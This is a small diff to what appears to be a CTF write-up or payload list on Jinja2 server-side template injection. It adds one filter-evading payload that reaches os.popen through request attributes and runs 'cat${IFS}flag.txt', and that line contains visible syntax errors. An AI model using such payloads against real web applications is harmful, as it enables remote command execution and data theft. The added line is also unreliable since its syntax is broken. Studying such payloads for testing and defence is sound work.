@@ -33,6 +33,7 @@ Then inject the second payload : `{{config.from_object('os')}}
 {%with a="Hello World"%}
 {%print(a)%}
 {%endwith}
+{%with a=request|attr("application")|attr("__globals__")|attr(__getitem__)(__builtins__)|attr__getitem__)(__import__)("os")|attr("popen")("cat${IFS}flag.txt")|attr("read")()%}
 ```
 
 ---
